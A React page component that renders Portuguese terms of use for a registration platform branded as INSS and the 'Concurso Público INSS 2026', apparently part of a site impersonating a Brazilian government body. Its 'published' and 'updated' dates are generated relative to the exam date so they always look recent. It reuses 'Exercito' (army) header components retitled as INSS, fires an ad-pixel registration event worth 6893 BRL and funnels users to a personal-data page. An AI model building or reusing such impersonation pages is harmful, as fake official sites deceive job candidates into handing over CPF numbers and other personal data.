import { useState, useEffect, useMemo } from 'react';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { getExamDate } from '@/utils/examDate';

export default function TermsOfUsePage() {
  const [hasAcceptedTerms, setHasAcceptedTerms] = useState(false);
  const [firstName, setFirstName] = useState('');
  const { trackEvent } = useClarityEvents();

  const dataPublicacao = useMemo(() => {
    const d = getExamDate();
    d.setDate(d.getDate() - 42);
    return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }, []);

  const dataAtualizacao = useMemo(() => {
    const d = getExamDate();
    d.setDate(d.getDate() - 21);
    return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }, []);

  useEffect(() => {
    window.scrollTo(0, 0);
    trackEvent('terms_page_entered', {
      page: 'terms_page',
      timestamp: new Date().toISOString()
    });
    try {
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      const nome = userData.nomeCompleto || userData.nome || '';
      if (nome) setFirstName(nome.split(' ')[0]);
    } catch {}
  }, []);

  const handleAcceptTerms = (checked: boolean) => {
    setHasAcceptedTerms(checked);
    trackEvent('terms_switch_toggled', {
      terms_accepted: checked,
      page: 'terms_page',
      timestamp: new Date().toISOString()
    });
  };

  const handleProceed = () => {
    if (hasAcceptedTerms) {
      const fbq = (window as any).fbq;
      if (fbq) {
        fbq('track', 'CompleteRegistration', {
          content_name: 'Termos de Uso Aceitos',
          content_category: 'Legal Acceptance',
          value: 6893.00,
          currency: 'BRL'
        });
      }
      window.location.href = '/pessoal';
    }
  };

  return (
    <div className="min-h-screen" style={{ background: '#fff', fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle="INSS" customSubtitle="Termos de Uso" />
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">

        <header className="mb-8">
          <h1 className="text-3xl font-bold mb-4 leading-tight" style={{ color: '#1A202C' }}>
            Termos e Condições de Uso — Plataforma de Inscrição Concurso INSS 2026
          </h1>
          <div className="flex items-center text-xs text-gray-500 mb-6 pb-4" style={{ borderBottom: '1px solid #E2E8F0' }}>
            <time>
              <span className="font-medium">Publicado em:</span> {dataPublicacao} às 10h00
            </time>
            <span className="mx-2 text-gray-300">|</span>
            <time>
              <span className="font-medium">Atualizado em:</span> {dataAtualizacao} às 10h00
            </time>
          </div>
        </header>

        <article>
          <div className="rounded-lg mb-8" style={{ background: '#fff', border: '1px solid #E2E8F0' }}>
            <div className="px-6 py-4" style={{ background: '#F7F8FA', borderBottom: '1px solid #E2E8F0', borderRadius: '8px 8px 0 0' }}>
              <h2 className="text-lg font-semibold" style={{ color: '#1A202C' }}>
                Instrumento de Adesão — Plataforma Digital de Inscrição
              </h2>
              <p className="text-sm mt-1" style={{ color: '#64748B' }}>
                Concurso Público — INSS 2026
              </p>
            </div>

            <div className="h-80 overflow-y-auto px-6 py-4 bg-white text-sm leading-relaxed">
              <div className="space-y-6" style={{ color: '#374151' }}>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    1. Aceitação dos Termos
                  </h3>
                  <p className="mb-4">
                    Ao utilizar esta plataforma digital de inscrição e acompanhamento do Concurso INSS 2026,
                    o usuário declara estar de acordo com os presentes Termos e Condições de Uso. Caso não concorde
                    com qualquer condição aqui estabelecida, recomenda-se não prosseguir com o cadastro.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    2. Descrição do Serviço
                  </h3>
                  <p className="mb-4">
                    Esta plataforma possibilita a inscrição e o acompanhamento das etapas do Concurso Público
                    do INSS 2026. O sistema oferece funcionalidades para envio de dados, consulta
                    de informações e acompanhamento da situação do candidato de forma segura e rastreável.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    3. Responsabilidades do Usuário
                  </h3>
                  <p className="mb-3">Ao utilizar este sistema, o candidato se compromete a:</p>
                  <ul className="list-disc ml-6 space-y-1 mb-4">
                    <li>Fornecer dados corretos, completos e atualizados;</li>
                    <li>Manter seus dados de acesso sob sigilo;</li>
                    <li>Não compartilhar credenciais com terceiros;</li>
                    <li>Utilizar a plataforma exclusivamente para fins relacionados ao processo seletivo;</li>
                    <li>Acompanhar regularmente as atualizações e prazos do processo seletivo.</li>
                  </ul>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    4. Proteção de Dados Pessoais (LGPD)
                  </h3>
                  <p className="mb-4">
                    Os dados informados são tratados em conformidade com a Lei Geral de Proteção de Dados
                    (Lei nº 13.709/2018 — LGPD) e utilizados exclusivamente para as finalidades do
                    Concurso Público INSS 2026.
                  </p>
                  <p className="mb-3">As categorias de dados coletados incluem:</p>
                  <ul className="list-disc ml-6 space-y-1 mb-4">
                    <li>Dados de identificação pessoal (CPF, nome, data de nascimento);</li>
                    <li>Dados de contato (e-mail, telefone, endereço);</li>
                    <li>Informações acadêmicas e histórico profissional;</li>
                    <li>Dados relativos às etapas e resultados do processo seletivo.</li>
                  </ul>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    5. Segurança do Sistema
                  </h3>
                  <p className="mb-3">
                    São adotadas medidas técnicas e organizacionais para proteção das informações do candidato.
                    Para colaborar com a segurança:
                  </p>
                  <ul className="list-disc ml-6 space-y-1 mb-4">
                    <li>Utilize senhas robustas e únicas;</li>
                    <li>Evite acessar a plataforma em dispositivos compartilhados;</li>
                    <li>Encerre a sessão após cada uso.</li>
                  </ul>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    6. Limitação de Responsabilidade
                  </h3>
                  <p className="mb-3">
                    A administração da plataforma não se responsabiliza por:
                  </p>
                  <ul className="list-disc ml-6 space-y-1 mb-4">
                    <li>Erros decorrentes de informações incorretas fornecidas pelo usuário;</li>
                    <li>Falhas de conectividade de responsabilidade do candidato;</li>
                    <li>Interrupções programadas para manutenção do sistema.</li>
                  </ul>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    7. Disponibilidade do Sistema
                  </h3>
                  <p className="mb-4">
                    A plataforma opera em regime contínuo, podendo ser submetida a atualizações periódicas
                    para aprimoramento da experiência e da segurança do usuário.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    8. Propriedade Intelectual
                  </h3>
                  <p className="mb-4">
                    Todo o conteúdo disponibilizado nesta plataforma é protegido por lei e destinado
                    exclusivamente ao uso do candidato no âmbito do processo seletivo vigente.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    9. Atualizações dos Termos
                  </h3>
                  <p className="mb-4">
                    Estes Termos podem ser revisados a qualquer momento. Recomenda-se a leitura periódica
                    para ciência de eventuais alterações.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    10. Contato e Suporte
                  </h3>
                  <p className="mb-4">
                    Em caso de dúvidas, utilize os canais de atendimento disponibilizados na própria plataforma.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    11. Legislação Aplicável
                  </h3>
                  <p className="mb-4">
                    O presente instrumento é regido pela legislação brasileira vigente, incluindo a
                    Lei Geral de Proteção de Dados (Lei nº 13.709/2018) e demais normas aplicáveis.
                  </p>
                </section>

                <section>
                  <h3 className="font-bold mb-3 uppercase tracking-wide text-xs" style={{ color: '#1A202C', letterSpacing: '0.06em' }}>
                    12. Disposições Finais
                  </h3>
                  <p className="mb-4">
                    Ao prosseguir com a inscrição, o candidato confirma ciência e concordância plena
                    com as condições aqui estabelecidas.
                  </p>
                  <p className="mb-6 text-center text-xs" style={{ color: '#94A3B8' }}>
                    Última atualização: 06 de abril de 2026
                  </p>
                  <div className="text-center border-t pt-4" style={{ borderColor: '#E2E8F0' }}>
                    <p className="font-semibold text-sm" style={{ color: '#1A202C' }}>
                      INSS<br />
                      Concurso Público INSS 2026 — Banca Organizadora: CEBRASPE
                    </p>
                  </div>
                </section>

              </div>
            </div>
          </div>

          {/* Seção de aceite — minimalista */}
          <div className="rounded-lg px-6 py-6" style={{ border: '1px solid #E2E8F0' }}>
            <h3 className="text-base font-semibold mb-1" style={{ color: '#1A202C' }}>
              {firstName ? `${firstName}, confirme seu aceite` : 'Confirmação de aceite'}
            </h3>
            <p className="text-xs mb-5" style={{ color: '#94A3B8' }}>
              Obrigatório para prosseguir com a inscrição
            </p>

            <div className="mb-5 space-y-1.5" style={{ borderLeft: '2px solid #E2E8F0', paddingLeft: 14 }}>
              {[
                'Li e compreendi os Termos e Condições de Uso acima',
                'Tenho ciência das responsabilidades do candidato neste processo',
              ].map((item, i) => (
                <p key={i} className="text-sm" style={{ color: '#64748B' }}>{item}</p>
              ))}
            </div>

            <label htmlFor="accept-terms" className="flex items-center gap-2.5 cursor-pointer mb-5">
              <input
                id="accept-terms"
                type="checkbox"
                checked={hasAcceptedTerms}
                onChange={(e) => handleAcceptTerms(e.target.checked)}
                style={{ width: 15, height: 15, accentColor: '#0063AF', cursor: 'pointer', flexShrink: 0 }}
              />
              <span className="text-sm" style={{ color: '#374151' }}>
                Declaro que li e aceito os termos acima
              </span>
            </label>

            <Button
              onClick={handleProceed}
              disabled={!hasAcceptedTerms}
              className="w-full font-semibold py-3 transition-all duration-200"
              style={{
                backgroundColor: hasAcceptedTerms ? '#0063AF' : '#F1F5F9',
                color: hasAcceptedTerms ? '#fff' : '#94A3B8',
                cursor: hasAcceptedTerms ? 'pointer' : 'default',
              }}
            >
              Aceitar e Prosseguir com a Inscrição
            </Button>
          </div>
        </article>
      </main>
      <ExercitoFooter />
    </div>
  );
}
